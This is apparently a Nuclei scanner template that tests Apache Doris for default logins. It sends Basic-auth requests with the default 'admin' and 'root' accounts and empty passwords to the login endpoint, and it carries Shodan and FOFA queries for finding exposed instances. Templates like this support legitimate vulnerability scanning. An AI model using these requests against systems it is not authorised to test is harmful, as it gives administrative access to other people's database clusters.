id: doris-default-login

info:
  name: Apache Doris 默认口令登录（弱口令）
  author: icarot
  severity: high
  description: |
    该模板通过尝试 Apache Doris 的已知默认口令，并依据认证成功后的响应特征判断目标是否仍在使用出厂弱口令。若命中，攻击者可直接进入管理界面并进一步修改配置或查看敏感信息。
  metadata:
    verified: true
    max-request: 2
    vendor: apache
    product: doris
    shodan-query: http.favicon.hash:"24048806"
    fofa-query: icon_hash=24048806
  tags: apache,default-login,doris,vuln

http:
  - raw:
      - |
        POST /rest/v1/login HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{basicAuth}}
        Content-Type: application/json; charset=utf-8

    payloads:
      basicAuth:
        - YWRtaW46
        - cm9vdDo=

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'msg":"Login success!"'

      - type: word
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200
# digest: 490a0046304402206798965e4eb020b40b0391ddf2559221c70c163292a65b57e6c8a2103d42769402200a3f3fcdad3c5cce62ad1fa578d445bf2fc47c67690a1df7aaa2db044e2f5562:922c64590222798bb761d5b6d8e72950